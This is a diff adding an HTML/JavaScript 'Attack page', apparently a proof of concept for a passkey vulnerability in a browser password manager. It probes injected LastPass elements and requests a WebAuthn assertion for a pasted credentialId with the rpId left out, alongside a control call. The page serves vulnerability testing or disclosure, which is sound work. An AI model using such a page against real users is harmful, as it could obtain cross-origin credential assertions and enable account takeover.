@@ -1,0 +1,38 @@
+<h2>Attack page</h2>
+<p>origin: <span id="org"></span></p>
+<h3>Case 1: field probe, no interaction</h3>
+<form><input autocomplete="username" name="q1" id="x1"></form>
+<pre id="probe">icon_root_count: 0</pre>
+<h3>Case 2 and control</h3>
+<p><input id="cid" size="70" placeholder="paste credentialId from the registration page"></p>
+<button onclick="go(true)">Case 2: allowCredentials, rpId omitted</button>
+<button onclick="go(false)">Control A: same call, no allowCredentials</button>
+<pre id="out"></pre>
+<script>
+document.getElementById('org').textContent=location.origin;
+function b64uToBuf(s){s=s.replace(/-/g,'+').replace(/_/g,'/');const p=s.length%4?'='.repeat(4-s.length%4):'';const b=atob(s+p);const u=new Uint8Array(b.length);for(let i=0;i<b.length;i++)u[i]=b.charCodeAt(i);return u.buffer;}
+function hex(b){return [...new Uint8Array(b)].map(x=>x.toString(16).padStart(2,'0')).join('');}
+new MutationObserver(()=>{const n=document.querySelectorAll('[data-lastpass-icon-root]').length;
+  document.getElementById('probe').textContent='icon_root_count: '+n+' at t+'+Math.round(performance.now())+'ms';
+}).observe(document.documentElement,{childList:true,subtree:true});
+async function go(withAllow){
+  const out=document.getElementById('out'), cid=document.getElementById('cid').value.trim();
+  out.textContent='requesting ...'; const t0=performance.now();
+  const pk={challenge:crypto.getRandomValues(new Uint8Array(32)),userVerification:"discouraged"};
+  if(withAllow) pk.allowCredentials=[{type:"public-key",id:b64uToBuf(cid)}];
+  try{
+    const c=await navigator.credentials.get({publicKey:pk});
+    out.textContent='elapsed_ms: '+Math.round(performance.now()-t0)+
+      '\nallowCredentials_sent: '+withAllow+'\npage_origin: '+location.origin+
+      '\nrequested_rpId: (omitted)\ncredentialId: '+c.id+
+      '\nuserHandle: '+(c.response.userHandle?new TextDecoder().decode(c.response.userHandle):'(null)')+
+      '\nsignature_bytes: '+new Uint8Array(c.response.signature).length+
+      '\nrpIdHash_hex: '+hex(c.response.authenticatorData.slice(0,32))+
+      '\nclientDataJSON: '+new TextDecoder().decode(c.response.clientDataJSON);
+  }catch(e){
+    out.textContent='elapsed_ms: '+Math.round(performance.now()-t0)+
+      '\nallowCredentials_sent: '+withAllow+'\npage_origin: '+location.origin+
+      '\nrejected_name: '+e.name+'\nrejected_message: '+e.message;
+  }
+}
+</script>
